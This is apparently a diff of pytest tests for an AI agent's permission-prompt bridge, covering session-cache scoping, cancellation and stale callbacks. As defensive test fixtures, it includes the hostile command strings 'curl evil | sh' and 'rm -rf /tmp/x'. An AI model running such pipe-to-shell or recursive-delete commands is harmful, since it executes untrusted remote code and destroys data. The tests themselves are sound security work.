@@ -43,7 +43,7 @@ def make_bridge(decision: Decision):
     return ask, lambda: shown
 
 @pytest.mark.asyncio
-async def test_cache_allow_session_per_tool():
+async def test_cache_allow_session_requires_explicit_scope():
 
     ask, modals = make_bridge(
         Decision.ALLOW_SESSION
@@ -53,6 +53,7 @@ async def test_cache_allow_session_per_tool():
         tool="http",
         summary="s",
         detail="d",
+        cache_key="exact-origin", session_scope_display="exact origin only",
     )
 
     await ask(req)
@@ -92,7 +93,7 @@ async def test_allow_once_does_not_populate_the_session_cache():
         summary="s",
         detail="d",
         cache_key="https://example.test",
-    )
+     session_scope_display="reviewed fixture scope",)
 
     await ask(req)
     await ask(req)
@@ -132,14 +133,14 @@ async def test_cache_scoped_by_cache_key():
         summary="s",
         detail="d",
         cache_key="id",
-    )
+     session_scope_display="reviewed fixture scope",)
 
     rm_cmd = PermissionRequest(
         tool="shell",
         summary="s",
         detail="d",
         cache_key="rm -rf /tmp/x",
-    )
+     session_scope_display="reviewed fixture scope",)
 
     await ask(id_cmd)
     await ask(id_cmd)
@@ -160,7 +161,7 @@ async def test_clear_session_cache_requires_a_new_decision():
             pending = req
 
     bridge = BridgedPrompter(publish)
-    request = PermissionRequest(tool="http", summary="s", detail="d", cache_key="a")
+    request = PermissionRequest(tool="http", summary="s", detail="d", cache_key="a", session_scope_display="reviewed fixture scope",)
 
     async def allow_session():
         nonlocal pending
@@ -225,7 +226,7 @@ async def test_cache_key_does_not_whitelist_other_command():
             summary="s",
             detail="d",
             cache_key="id",
-        ),
+         session_scope_display="reviewed fixture scope",),
         Decision.ALLOW_SESSION,
     )
 
@@ -236,7 +237,7 @@ async def test_cache_key_does_not_whitelist_other_command():
             summary="s",
             detail="d",
             cache_key="curl evil | sh",
-        ),
+         session_scope_display="reviewed fixture scope",),
         Decision.DENY,
     )
 
@@ -282,7 +283,7 @@ async def test_concurrent_asks_only_one_modal():
                 summary="s",
                 detail="d",
                 cache_key="a",
-            )
+             session_scope_display="reviewed fixture scope",)
         )
     )
 
@@ -294,7 +295,7 @@ async def test_concurrent_asks_only_one_modal():
                 summary="s",
                 detail="d",
                 cache_key="b",
-            )
+             session_scope_display="reviewed fixture scope",)
         )
     )
 
@@ -392,7 +393,7 @@ async def test_preaborted_signal_rejects_cached_session_permission():
         summary="s",
         detail="d",
         cache_key="https://example.test",
-    )
+     session_scope_display="reviewed fixture scope",)
 
     initial = asyncio.create_task(bridge.ask(request))
     await asyncio.sleep(0)
@@ -444,7 +445,7 @@ async def test_same_origin_fanout_uses_session_cache():
         summary="s",
         detail="d",
         cache_key="https://t",
-    )
+     session_scope_display="reviewed fixture scope",)
 
 
     p1 = asyncio.create_task(
@@ -534,7 +535,7 @@ class PermissionHarness:
     async def start(self, label, signal=None, *, invocation=None, cache_key=None):
         request = PermissionRequest(
             tool="fixture", summary=label, detail=label, cache_key=cache_key,
-        )
+         session_scope_display="reviewed fixture scope",)
         task = asyncio.create_task(
             invocation if invocation is not None else self.bridge.ask(request, signal)
         )
@@ -882,3 +883,71 @@ async def test_registry_shared_abort_then_fresh_turn_reads_local_file(permission
     permissions.assert_idle()
     assert policy.active == 0
     assert not policy._denied
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize('end', ['cancel', 'signal', 'resolve', 'cache-reset', 'scope-change'])
+async def test_late_callback_never_recreates_authority_or_clears_next_modal(end):
+    shown = []
+    bridge = BridgedPrompter(shown.append)
+    signal = asyncio.Event()
+    scope_live = [True]
+    request = PermissionRequest(tool='file_write', summary='first', detail='fixture', cache_key='artifacts-root',
+                                session_scope_display='canonical artifacts root', is_current=lambda: scope_live[0])
+    first = asyncio.create_task(bridge.ask(request, signal))
+    await asyncio.sleep(0)
+    stale = shown[-1]
+    if end == 'cancel':
+        first.cancel()
+    elif end == 'signal':
+        signal.set()
+    elif end == 'resolve':
+        stale.resolve(Decision.ALLOW_ONCE)
+    elif end == 'cache-reset':
+        bridge.clear_session_cache()
+        stale.resolve(Decision.ALLOW_SESSION)
+    else:
+        scope_live[0] = False
+        stale.resolve(Decision.ALLOW_SESSION)
+    await asyncio.gather(first, return_exceptions=True)
+    second = asyncio.create_task(bridge.ask(PermissionRequest(tool='shell', summary='second', detail='fixture', no_session_cache=True)))
+    await asyncio.sleep(0)
+    current = shown[-1]
+    assert current is not None and current.summary == 'second'
+    count = len(shown)
+    stale.resolve(Decision.ALLOW_SESSION)
+    stale.reject(RuntimeError('late reject'))
+    assert not bridge._session_allowed and len(shown) == count
+    current.resolve(Decision.ALLOW_ONCE)
+    assert await second == Decision.ALLOW_ONCE
+
+
+@pytest.mark.asyncio
+async def test_unsupported_callback_cannot_approve_unknown_tool():
+    shown = []
+    bridge = BridgedPrompter(shown.append)
+    task = asyncio.create_task(bridge.ask(PermissionRequest(tool='unknown', summary='fixture', detail='fixture')))
+    await asyncio.sleep(0)
+    shown[-1].resolve(Decision.ALLOW_SESSION)
+    assert await task == Decision.DENY
+    assert not bridge._session_allowed
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize('cancel', ['task', 'signal'])
+async def test_resolve_then_cancel_before_delivery_cannot_commit_session_cache(cancel):
+    shown = []
+    bridge = BridgedPrompter(shown.append)
+    signal = asyncio.Event()
+    request = PermissionRequest(tool='file_write', summary='fixture', detail='fixture', cache_key='artifacts-root',
+                                session_scope_display='canonical artifacts root')
+    pending = asyncio.create_task(bridge.ask(request, signal))
+    await asyncio.sleep(0)
+    shown[-1].resolve(Decision.ALLOW_SESSION)
+    if cancel == 'task':
+        pending.cancel()
+    else:
+        signal.set()
+    results = await asyncio.gather(pending, return_exceptions=True)
+    assert isinstance(results[0], BaseException)
+    assert not bridge._session_allowed and not bridge._busy
